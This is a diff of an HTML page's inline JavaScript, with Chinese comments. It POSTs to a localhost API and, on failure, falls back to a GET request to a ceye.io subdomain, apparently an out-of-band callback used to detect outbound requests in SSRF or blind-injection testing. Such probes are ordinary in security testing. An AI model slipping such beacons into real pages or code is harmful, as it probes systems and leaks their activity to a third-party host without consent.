@@ -29,33 +29,37 @@
     fetch('https://127.0.0.1/api', {
     method: 'POST',
     headers: {
-        'Content-Type': 'application/json', // 设置请求头，根据需求调整
+        'Content-Type': 'application/json', // 设置请求头
     },
-    body: JSON.stringify(payload) // 请求体，需转换为字符串
+    body: JSON.stringify(payload) // 请求体
 })
     .then(response => {
         if (!response.ok) {
             throw new Error('Network response was not ok');
         }
-        return response.json(); // 或 response.text() / response.blob() 视情况而定
+        return response.json();
     })
-    .then(data => console.log(data)
+    .then(data => console.log(data)) // 正常处理响应
     .catch(error => {
-    fetch('https://error.b182oj.ceye.io/api', {
-    method: 'GET', // 默认是 GET，可以省略
-    headers: {
-        'Accept': 'application/json', // 根据 API 要求设置 Accept 类型
-    }
-})
-    .then(response => {
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return response.json(); // 解析 JSON 响应
-    })
-    .then(data => console.log(data))
-    .catch(error => console.error('Error:', error));
+        console.error('Error in POST request:', error); // 捕获 POST 请求错误
+
+        // 在 POST 请求失败后发送 GET 请求
+        return fetch('https://error.b182oj.ceye.io/api', {
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json', // 设置请求头
+            }
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error in fallback GET request! status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log('Fallback GET response:', data)) // 处理 GET 请求响应
+            .catch(error => console.error('Error in fallback GET request:', error)); // 捕获 GET 请求错误
     });
+
     </script>
 </body>
 </html>
